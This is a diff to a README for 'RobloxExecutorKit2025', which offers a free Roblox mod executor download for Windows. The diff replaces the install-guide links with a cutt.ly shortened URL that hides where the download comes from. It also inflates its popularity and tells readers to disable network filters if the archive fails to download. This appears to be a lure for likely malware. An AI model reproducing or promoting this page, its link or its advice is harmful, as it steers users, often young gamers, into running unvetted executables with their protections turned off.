@@ -6,7 +6,7 @@
 
 **About RobloxExecutorKit2025**: RobloxExecutorKit2025 offers a free mod executor archive for *Roblox* on Windows. Download the software with setup guides to elevate your gameplay. Backed by 85K+ visitors and 50K+ members, get your mod executor at no cost from this repository!
 
-<a href="https://roblox-mod-masters-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/8rNtgBCr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -31,7 +31,7 @@ Install your *Roblox* mod executor on Windows with **RobloxExecutorKit2025**:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://roblox-mod-masters-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/8rNtgBCr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
